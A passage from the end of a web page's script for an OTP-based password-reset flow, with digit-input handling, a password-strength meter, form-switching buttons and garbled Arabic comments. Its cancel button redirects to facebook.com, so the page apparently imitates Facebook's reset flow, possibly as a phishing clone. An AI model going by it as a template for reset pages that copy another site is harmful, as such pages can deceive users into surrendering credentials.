            element.innerHTML = message;
            element.style.display = 'block';
        }
        
        // ØªØ­Ø³ÙŠÙ† Ø¥Ø¯Ø®Ø§Ù„ OTP
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                // Ø§Ù„Ø³Ù…Ø§Ø­ ÙÙ‚Ø· Ø¨Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø§Ù„ØªØ§Ù„ÙŠØ©: Ø§Ù„Ø£Ø±Ù‚Ø§Ù…ØŒ backspaceØŒ deleteØŒ Ø§Ù„Ø£Ø³Ù‡Ù…
                const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Tab'];
                if (!/^[0-9]$/.test(e.key) && !allowedKeys.includes(e.key)) {
                    e.preventDefault();
                }
            });
            
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                alert('ØºÙŠØ± Ù…Ø³Ù…ÙˆØ­ Ø¨Ù„ØµÙ‚ Ø§Ù„Ù†ØµÙˆØµ ÙÙŠ Ø­Ù‚ÙˆÙ„ OTP');
            });
        });
        
        // Ù…Ø¤Ø´Ø± Ù‚ÙˆØ© ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±
        newPassword.addEventListener('input', () => {
            const strength = calculatePasswordStrength(newPassword.value);
            strengthBar.style.width = strength + '%';
            strengthBar.style.backgroundColor = getStrengthColor(strength);
        });
        
        function calculatePasswordStrength(password) {
            let strength = 0;
            
            // Ø·ÙˆÙ„ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±
            if (password.length > 0) strength += 10;
            if (password.length >= 6) strength += 20;
            if (password.length >= 8) strength += 20;
            if (password.length >= 10) strength += 20;
            
            // Ø£Ø­Ø±Ù Ù…ØªÙ†ÙˆØ¹Ø©
            if (/[A-Z]/.test(password)) strength += 10;
            if (/[0-9]/.test(password)) strength += 10;
            if (/[^A-Za-z0-9]/.test(password)) strength += 10;
            
            return Math.min(strength, 100);
        }
        
        function getStrengthColor(strength) {
            if (strength < 40) return '#ff4d4f';
            if (strength < 70) return '#faad14';
            return '#52c41a';
        }
        
        // Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ©
        cancelBtn.addEventListener('click', () => {
            window.location.href = 'https://www.facebook.com';
        });
        
        backBtn.addEventListener('click', () => {
            otpForm.style.display = 'none';
            emailForm.style.display = 'block';
        });
        
        cancelResetBtn.addEventListener('click', () => {
            resetForm.style.display = 'none';
            emailForm.style.display = 'block';
        });
    </script>
</body>
</html>
